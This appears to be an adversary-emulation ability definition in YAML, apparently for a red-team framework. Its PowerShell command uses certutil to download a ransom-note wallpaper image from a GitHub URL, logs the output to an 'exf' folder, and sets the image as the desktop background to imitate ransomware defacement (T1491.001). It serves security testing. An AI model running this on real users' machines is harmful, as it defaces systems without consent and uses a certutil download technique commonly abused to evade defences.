- name: Download and Change user's desktop wallpaper
  additional_info: {}
  plugin: ''
  executors:
  - name: psh
    code: null
    uploads: []
    command: "$Exf_File=\"$env:PUBLIC\\exf\\Download_back.log\";\n$DestinationFile\
      \ = \"$env:HOMEDRIVE\\$env:USERPROFILE\\Documents\\backgroundransom.jpg\";\n\
      $DownloadURL=\"https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg\"\
      ;\n$CompleteCommand= \"certutil -urlcache -f \"+\" $DownloadURL\"+\" $DestinationFile\"\
      ;\nInvoke-Expression  $CompleteCommand | Out-File \"$Exf_File\";\n$MyWallpaper=\"\
      $DestinationFile\";\n\n$code = @' ; using System.Runtime.InteropServices; namespace\
      \ Win32{;     public class Wallpaper{ ;         [DllImport(\"user32.dll\", CharSet=CharSet.Auto)]\
      \ ;          static extern int SystemParametersInfo (int uAction , int uParam\
      \ , string lpvParam , int fuWinIni) ;          ;          public static void\
      \ SetWallpaper(string thePath){ ;             SystemParametersInfo(20,0,thePath,3);\
      \         };     }; } ; '@;\n\nadd-type $code; \n\n[Win32.Wallpaper]::SetWallpaper($MyWallpaper);"
    variations: []
    build_target: null
    cleanup: []
    language: null
    payloads: []
    platform: windows
    timeout: 60
    parsers: []
    additional_info: {}
  tactic: impact
  description: 'Downloads an image from a GitHUB and change it, to define as wallpaper. '
  technique_id: T1491.001
  requirements: []
  delete_payload: true
  privilege: ''
  technique_name: 'Defacement: Internal Defacement'
  singleton: false
  access: {}
  buckets:
  - impact
  repeatable: false
  id: desktop_change_ps
